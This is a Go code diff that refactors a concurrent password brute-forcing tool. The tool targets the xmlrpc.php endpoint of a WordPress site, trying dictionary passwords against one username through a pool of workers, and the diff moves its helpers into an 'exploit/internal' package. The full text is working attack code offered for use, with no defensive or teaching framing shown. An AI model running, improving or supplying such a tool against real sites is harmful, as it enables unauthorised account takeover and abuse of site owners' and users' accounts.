@@ -2,9 +2,12 @@ package main
 
 import (
 	"errors"
+	"exploit/internal"
 	"flag"
 	"fmt"
+	"net/http"
 	"os"
+	"time"
 )
 
 type CommandLineArgs struct {
@@ -41,19 +44,23 @@ func run() error {
 		return err
 	}
 
-	pwdChan, err := getPasswords(args.Dict)
+	pwdChan, err := internal.GetPasswords(args.Dict)
 	if err != nil {
 		return fmt.Errorf("failed to read passwords file: %w", err)
 	}
 
 	url := fmt.Sprintf("%s/xmlrpc.php", args.Url)
-	results := make(chan Result)
+	results := make(chan internal.Result)
+
+	client := http.Client{
+		Timeout: time.Second * 10,
+	}
 
 	executor := &Executor{
 		Url:        url,
 		MaxWorkers: args.MaxWorkers,
 	}
-	go executor.Run(args.Username, pwdChan, results)
+	go executor.Run(&client, args.Username, pwdChan, results)
 
 	attempts := 1
 	for {
@@ -84,19 +91,20 @@ type Executor struct {
 }
 
 func (e *Executor) Run(
+	client *http.Client,
 	username string,
 	passwords <-chan string,
-	results chan<- Result,
+	results chan<- internal.Result,
 ) {
 	fmt.Printf("[!] initiating requests \n")
 	sem := make(chan int, e.MaxWorkers)
 
 	for password := range passwords {
-		credentials := &Credentials{username, password}
+		credentials := &internal.Credentials{Username: username, Password: password}
 
-		go func(creds *Credentials) {
+		go func(creds *internal.Credentials) {
 			sem <- 1
-			result, err := attemptLogin(e.Url, credentials)
+			result, err := internal.AttemptLogin(client, e.Url, credentials)
 			if err != nil {
 				fmt.Printf("[!] failed to attempt login: %s\n", err.Error())
 				return
